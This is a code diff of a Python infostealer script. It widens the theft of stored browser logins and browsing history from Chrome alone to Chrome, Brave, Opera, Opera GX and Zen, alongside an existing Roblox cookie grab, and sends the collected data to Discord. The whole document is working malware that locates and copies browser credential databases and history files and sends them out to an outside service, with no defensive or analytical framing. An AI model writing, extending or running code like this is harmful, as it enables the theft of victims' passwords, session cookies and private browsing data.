@@ -261,7 +261,7 @@ def retrieve_roblox_cookies():
     except Exception as e:
         send_to_discord(f"❌ Unexpected error: {e}")
 
-def get_login_data_path():
+def get_login_data_path(browser):
     try:
         user_profile = os.environ['USERPROFILE']
         base_paths = {
@@ -272,14 +272,13 @@ def get_login_data_path():
             "Zen": os.path.join(user_profile, r"AppData\Local\Zen\Zen\User Data")
         }
 
-        for browser, base_path in base_paths.items():
-            for profile in ["Default", "Profile 1", "Profile 2"]:
-                candidate = os.path.join(base_path, profile, "Login Data")
-                if os.path.exists(candidate):
-                    return candidate, browser
+        for profile in ["Default", "Profile 1", "Profile 2"]:
+            candidate = os.path.join(base_paths[browser], profile, "Login Data")
+            if os.path.exists(candidate):
+                return candidate
     except:
         pass
-    return None, None
+    return None
 
 def copy_database(source_path, temp_path):
     try:
@@ -328,9 +327,9 @@ def send_file_to_discord(file_path):
     except:
         pass
 
-def collect_chrome_logins():
+def collect_browser_logins(browser):
     try:
-        original_db, browser = get_login_data_path()
+        original_db = get_login_data_path(browser)
         if not original_db:
             return
 
@@ -348,27 +347,20 @@ def collect_chrome_logins():
     except:
         pass
 
-def get_size(bytes, suffix="B"):
-    factor = 1024
-    for unit in ["", "K", "M", "G", "T"]:
-        if bytes < factor:
-            return f"{bytes:.2f} {unit}{suffix}"
-        bytes /= factor
+def get_browser_history(browser, limit=100):
+    history_paths = {
+        "Chrome": os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Default\History"),
+        "Brave": os.path.join(os.environ['LOCALAPPDATA'], r"BraveSoftware\Brave-Browser\User Data\Default\History"),
+        "Opera": os.path.join(os.environ['APPDATA'], r"Opera Software\Opera Stable\History"),
+        "Opera GX": os.path.join(os.environ['APPDATA'], r"Opera Software\Opera GX Stable\History"),
+        "Zen": os.path.join(os.environ['LOCALAPPDATA'], r"Zen\Zen\User Data\Default\History")
+    }
 
-def get_user_email():
-    try:
-        result = subprocess.run(
-            ["powershell", "-Command", "(Get-CimInstance -ClassName Win32_UserAccount | Where-Object {$_.LocalAccount -eq $false}).Name"],
-            capture_output=True, text=True
-        )
-        email = result.stdout.strip()
-        return email if email else "No Microsoft account email found"
-    except Exception as e:
-        return f"Error: {e}"
+    original_path = history_paths.get(browser)
+    if not original_path or not os.path.exists(original_path):
+        return "History path not found for browser."
 
-def get_chrome_history(limit=100):
-    original_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History")
-    temp_path = os.path.join(tempfile.gettempdir(), "chrome_history_copy")
+    temp_path = os.path.join(tempfile.gettempdir(), f"{browser}_history_copy")
 
     try:
         shutil.copy2(original_path, temp_path)
@@ -391,9 +383,9 @@ def get_chrome_history(limit=100):
         return "\n".join(history_lines)
 
     except Exception as e:
-        return f"Error accessing Chrome history: {e}"
+        return f"Error accessing {browser} history: {e}"
 
-def send_history_to_discord(history_text):
+def send_history_to_discord(history_text, browser):
     with tempfile.NamedTemporaryFile("w+", delete=False, suffix=".txt", encoding="utf-8") as temp_file:
         temp_file.write(history_text)
         temp_file_path = temp_file.name
@@ -415,8 +407,14 @@ if __name__ == "__main__":
     # Run only the stable functions (NO SYSTEM INFO)
     main()
     retrieve_roblox_cookies()
-    collect_chrome_logins()
 
-    # Browser history
-    history = get_chrome_history(limit=100)
-    status = send_history_to_discord(history)
+    # Collect logins and history for each browser
+    browsers = ["Chrome", "Brave", "Opera", "Opera GX", "Zen"]
+    for browser in browsers:
+        collect_browser_logins(browser)
+        history = get_browser_history(browser, limit=100)
+        status = send_history_to_discord(history, browser)
+        if status == 200:
+            print(f"History for {browser} sent to Discord successfully.")
+        else:
+            print(f"Failed to send history for {browser} to Discord. Status code: {status}")
